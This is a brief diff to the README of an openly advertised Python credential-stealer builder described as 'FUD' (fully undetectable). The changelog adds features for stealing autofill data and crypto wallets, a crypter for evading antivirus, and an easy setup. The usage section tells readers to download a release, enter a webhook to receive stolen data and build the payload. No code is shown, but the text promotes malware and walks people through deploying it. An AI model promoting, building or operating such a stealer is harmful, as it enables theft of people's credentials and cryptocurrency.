@@ -21,7 +21,8 @@ FUD Stealer in Python, V20 compatible
 -✅added fud crypter**  
 # V2.2
 **-✅added autofills steal  
--✅added wallets and crypto wallets steal**   
+-✅added wallets and crypto wallets steal  
+-✅added setup for ease of access**   
 # Usage  
 Download from 'Releases'  
 Put in your webhook, select what functions you want to use and click *BUILD*
